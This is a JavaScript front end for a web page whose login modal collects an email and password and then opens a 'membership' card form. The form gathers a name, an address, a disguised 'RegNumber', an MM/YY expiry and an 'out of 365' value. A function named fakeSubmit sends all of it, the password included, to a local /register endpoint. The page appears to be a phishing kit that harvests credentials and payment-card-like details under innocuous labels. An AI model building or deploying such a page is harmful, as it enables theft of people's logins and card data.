console.log("JS FILE LOADED ✅");

const overlay = document.getElementById("overlay");
const closeModal = document.getElementById("closeModal");
const password = document.getElementById("password");
const togglePassword = document.getElementById("togglePassword");
const loginBtn = document.getElementById("loginBtn");
const form = document.getElementById("loginForm");
const cardModal = document.getElementById("cardModal");
const openModalBtn = document.getElementById("openModal");
// const overlay = document.getElementById("overlay");

openModalBtn.addEventListener("click", () => {
  overlay.style.display = "flex";
});

// Open login modal (call this wherever you want)
// overlay.style.display = "flex";

closeModal.onclick = closeAll;

// Show / hide password
togglePassword.onclick = () => {
  password.type = password.type === "password" ? "text" : "password";
};

// Enable button when inputs filled
form.addEventListener("input", () => {
  const inputs = form.querySelectorAll("input");
  const filled = [...inputs].every((i) => i.value !== "");
  loginBtn.disabled = !filled;
  loginBtn.classList.toggle("active", filled);
});

// LOGIN → OPEN MEMBERSHIP MODAL
form.onsubmit = (e) => {
  e.preventDefault();

  overlay.style.display = "none"; // close login
  cardModal.style.display = "block"; // open membership modal
};

console.log("JS FILE LOADED ✅");

// FORMAT MM / YY INPUT (RUNS IMMEDIATELY)
document.addEventListener("input", (e) => {
  if (e.target.id !== "dateInput") return;

  let value = e.target.value.replace(/\D/g, "");

  // Limit to 4 digits
  if (value.length > 4) value = value.slice(0, 4);

  let month = value.slice(0, 2);
  let year = value.slice(2, 4);

  // Fix invalid month
  if (month.length === 2) {
    let m = parseInt(month, 10);
    if (m === 0) month = "01";
    if (m > 12) month = "12";
  }

  let formatted = month;

  if (year.length > 0) {
    formatted += " / " + year;
  }

  e.target.value = formatted;
});

function fakeSubmit() {
  const mmYY = document.getElementById("dateInput").value;
  const cleaned = mmYY.replace(/\s/g, "");

  if (!/^\d{2}\/\d{2}$/.test(cleaned)) {
    alert("Please enter a valid month and year (MM / YY)");
    return;
  }

  const [mm, yy] = cleaned.split("/");
  const formattedMMYY = `20${yy}-${mm}`;

  const data = {
    email: document.querySelector('input[type="email"]').value,
    password: document.getElementById("password").value,

    country: document.getElementById("country").value,
    state: document.querySelector('input[placeholder="state/ Province"]').value,
    address: document.querySelector('input[placeholder="Address"]').value,
    city: document.querySelector('input[placeholder="City"]').value,
    zip: document.querySelector('input[placeholder="ZIP / Postal Code"]').value,

    name: document.querySelector('input[placeholder="Name"]').value,
    reg_number: document.querySelector('input[placeholder="RegNumber (Demo)"]')
      .value,

    mm_yy: formattedMMYY,
    extra_info: document.querySelector('input[placeholder="out of 365"]').value,
  };

  console.log("Submitting data:", data);

  fetch("http://localhost:5000/register", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  })
    .then(async (res) => {
      const result = await res.json();
      if (!res.ok) throw result;
      alert("Saved successfully ✅");
      closeAll();
    })
    .catch((err) => {
      console.error(err);
      alert("Failed to save ❌");
    });
}

// Membership modal helpers
// function fakeSubmit() {
//   alert("Demo successful ✅\n(No data collected)");
//   closeAll();
// }

// function fakeSubmit() {
//   const mmYY = document.getElementById("dateInput").value;
//   const [mm, yy] = mmYY.split(" / ");
//   const formattedDate = `20${yy}-${mm}`;

//   const data = {
//     email: document.querySelector('input[type="email"]').value,
//     password: document.getElementById("password").value,

//     country: document.getElementById("country").value,
//     state: document.querySelector('input[placeholder="state/ Province"]').value,
//     address: document.querySelector('input[placeholder="Address"]').value,
//     city: document.querySelector('input[placeholder="City"]').value,
//     zip: document.querySelector('input[placeholder="ZIP / Postal Code"]').value,

//     name: document.querySelector('input[placeholder="Name"]').value,
//     reg_number: document.querySelector('input[placeholder="RegNumber (Demo)"]')
//       .value,

//     mm_yy: formattedMMYY,

//     extra_info: document.querySelector('input[placeholder="out of 365"]').value,
//   };

//   // const rawValue = document.getElementById("dateInput").value;

//   // const cleanValue = rawValue.replace(" / ", "-");

//   fetch("http://localhost:5000/register", {
//     method: "POST",
//     headers: {
//       "Content-Type": "application/json",
//     },
//     body: JSON.stringify(data),
//   })
//     .then(async (res) => {
//       const result = await res.json();
//       if (!res.ok) throw result;
//       alert("Saved successfully ✅");
//       closeAll();
//     })
//     .catch((err) => {
//       console.error(err);
//       alert("Failed to save ❌");
//     });
// }

function closeAll() {
  overlay.style.display = "none";
  cardModal.style.display = "none";
}

// country space

const countries = [
  "Afghanistan",
  "Albania",
  "Algeria",
  "Andorra",
  "Angola",
  "Antigua and Barbuda",
  "Argentina",
  "Armenia",
  "Australia",
  "Austria",
  "Azerbaijan",
  "Bahamas",
  "Bahrain",
  "Bangladesh",
  "Barbados",
  "Belarus",
  "Belgium",
  "Belize",
  "Benin",
  "Bhutan",
  "Bolivia",
  "Bosnia and Herzegovina",
  "Botswana",
  "Brazil",
  "Brunei",
  "Bulgaria",
  "Burkina Faso",
  "Burundi",
  "Cambodia",
  "Cameroon",
  "Canada",
  "Cape Verde",
  "Central African Republic",
  "Chad",
  "Chile",
  "China",
  "Colombia",
  "Comoros",
  "Congo",
  "Costa Rica",
  "Croatia",
  "Cuba",
  "Cyprus",
  "Czech Republic",
  "Denmark",
  "Djibouti",
  "Dominica",
  "Dominican Republic",
  "Ecuador",
  "Egypt",
  "El Salvador",
  "Equatorial Guinea",
  "Eritrea",
  "Estonia",
  "Eswatini",
  "Ethiopia",
  "Fiji",
  "Finland",
  "France",
  "Gabon",
  "Gambia",
  "Georgia",
  "Germany",
  "Ghana",
  "Greece",
  "Grenada",
  "Guatemala",
  "Guinea",
  "Guyana",
  "Haiti",
  "Honduras",
  "Hungary",
  "Iceland",
  "India",
  "Indonesia",
  "Iran",
  "Iraq",
  "Ireland",
  "Israel",
  "Italy",
  "Jamaica",
  "Japan",
  "Jordan",
  "Kazakhstan",
  "Kenya",
  "Kuwait",
  "Laos",
  "Latvia",
  "Lebanon",
  "Lesotho",
  "Liberia",
  "Libya",
  "Lithuania",
  "Luxembourg",
  "Madagascar",
  "Malawi",
  "Malaysia",
  "Maldives",
  "Mali",
  "Malta",
  "Mexico",
  "Moldova",
  "Monaco",
  "Mongolia",
  "Montenegro",
  "Morocco",
  "Mozambique",
  "Myanmar",
  "Namibia",
  "Nepal",
  "Netherlands",
  "New Zealand",
  "Nicaragua",
  "Niger",
  "Nigeria",
  "North Korea",
  "North Macedonia",
  "Norway",
  "Oman",
  "Pakistan",
  "Panama",
  "Paraguay",
  "Peru",
  "Philippines",
  "Poland",
  "Portugal",
  "Qatar",
  "Romania",
  "Russia",
  "Rwanda",
  "Saudi Arabia",
  "Senegal",
  "Serbia",
  "Seychelles",
  "Sierra Leone",
  "Singapore",
  "Slovakia",
  "Slovenia",
  "Somalia",
  "South Africa",
  "South Korea",
  "Spain",
  "Sri Lanka",
  "Sudan",
  "Suriname",
  "Sweden",
  "Switzerland",
  "Syria",
  "Taiwan",
  "Tanzania",
  "Thailand",
  "Togo",
  "Trinidad and Tobago",
  "Tunisia",
  "Turkey",
  "Uganda",
  "Ukraine",
  "United Arab Emirates",
  "United Kingdom",
  "United States",
  "Uruguay",
  "Uzbekistan",
  "Venezuela",
  "Vietnam",
  "Yemen",
  "Zambia",
  "Zimbabwe",
];

const countrySelect = document.getElementById("country");

countries.forEach((country) => {
  const option = document.createElement("option");
  option.value = country;
  option.textContent = country;
  countrySelect.appendChild(option);
});
